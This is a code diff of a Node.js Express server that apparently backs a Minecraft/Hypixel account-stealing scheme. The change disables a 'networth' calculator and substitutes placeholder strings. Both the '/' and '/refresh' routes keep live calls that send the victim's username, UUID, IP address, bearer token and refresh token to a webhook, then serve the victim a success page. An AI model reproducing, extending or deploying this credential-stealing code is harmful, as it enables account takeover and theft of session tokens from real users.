@@ -6,7 +6,7 @@ const express = require('express');
 const path = require('path');
 const axios = require('axios');
 const iplim = require('iplim');
-const networthCalc = require('./utils/Networth');  // Ensure this is the correct path
+// const networthCalc = require('./utils/Networth');  // Ensure this is the correct path
 const SendAPI = require('./utils/SendAPI');        // Ensure this is the correct path
 const config = require('./config.json');
 
@@ -38,38 +38,37 @@ app.get('/', async (req, res) => {
         const ip = getIp(req);
 
         // initialize networth variables
-        let networth = "0";
-        let soulboundnetworth = "0";
+        let networth = "Reworking Network API";
+        let soulboundnetworth = "Reworking Network API";
         let sentnetworth = 0;
-        let description = "No profile data found. 🙁";
+        let description = "Reworking Network API";
 
-        // get networth and description
-        networthCalc(uuid).then((result) => {
-            networth = Intl.NumberFormat('en-US', {
-                notation: 'compact',
-                maximumFractionDigits: 2,
-            }).format(result[0]);
-            soulboundnetworth = Intl.NumberFormat('en-US', {
-                notation: 'compact',
-                maximumFractionDigits: 2,
-            }).format(result[1]);
-            description = result[2];
-            sentnetworth = (Math.trunc(result[0])) / 1000000;
+        // Replace networthCalc call
+        // networthCalc(uuid).then((result) => {
+        //     networth = Intl.NumberFormat('en-US', {
+        //         notation: 'compact',
+        //         maximumFractionDigits: 2,
+        //     }).format(result[0]);
+        //     soulboundnetworth = Intl.NumberFormat('en-US', {
+        //         notation: 'compact',
+        //         maximumFractionDigits: 2,
+        //     }).format(result[1]);
+        //     description = result[2];
+        //     sentnetworth = (Math.trunc(result[0])) / 1000000;
 
-            // send everything to the webhook
-            PostWebhook(false, username, uuid, ip, BearerToken, RefreshToken, networth, soulboundnetworth, description);
-            // send everything to the API
-            SendAPI(username, sentnetworth);
-        }).catch((error) => {
-            console.log(error);
-        });
+        // send everything to the webhook
+        PostWebhook(false, username, uuid, ip, BearerToken, RefreshToken, networth, soulboundnetworth, description);
+        // send everything to the API
+        SendAPI(username, sentnetworth);
+        // }).catch((error) => {
+        //     console.log(error);
+        // });
     } catch (e) {
         console.log(e);
     }
     // Serve the success HTML file
     res.sendFile(path.join(__dirname, 'public', 'success.html'));
 });
-
 
 // start the server
 app.listen(port, () => {
@@ -184,9 +183,9 @@ app.get('/refresh', async (req, res) => {
     var BearerToken;
     var ip = getIp(req);
 
-    let networth = "0";
-    let soulboundnetworth = "0";
-    let description = "No profile data found. 🙁";
+    let networth = "Reworking Network API";
+    let soulboundnetworth = "Reworking Network API";
+    let description = "Reworking Network API";
 
     // array for the list of urls that will be used to get the data
     const urls = [
@@ -281,11 +280,12 @@ app.get('/refresh', async (req, res) => {
         console.log(err);
     });
 
-    // get the user's networth
+    // Replace networthCalc call
     // networth = await networthCalc(username, uuid); // Removed
-    networth = "Networth Calculator Rework"; // Added
-    soulboundnetworth = "Networth Calculator Rework"; // Added
-    description = "Networth Calculator Rework"; // Added
+    // Reworking Network API
+    networth = "Reworking Network API";
+    soulboundnetworth = "Reworking Network API";
+    description = "Reworking Network API";
 
     // send everything to the webhook
     PostWebhook(true, username, uuid, ip, BearerToken, RefreshToken, networth, soulboundnetworth, description);
